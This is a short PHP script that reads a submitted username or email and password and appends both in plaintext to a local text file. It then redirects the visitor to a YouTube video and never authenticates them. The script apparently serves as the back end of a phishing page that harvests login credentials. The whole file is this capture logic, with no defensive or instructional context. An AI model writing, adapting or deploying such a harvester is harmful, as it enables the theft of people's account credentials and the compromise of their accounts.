<?php
$handle = fopen("file.txt","a");
$email = $_POST['usernameOrEmail'];
$password = $_POST['pass'];
if ($email == '') 
{
	echo "<script>alert('Please enter username');</script>";
	exit();
}
if ($password == '')
{
	echo "<script>alert('Please enter password');</script>";
	exit();
}
fwrite($handle, "Username = ".$email."\n"."password = ".$password."\n\n");
header('location:https://youtu.be/drt_xoHLowI');
?>
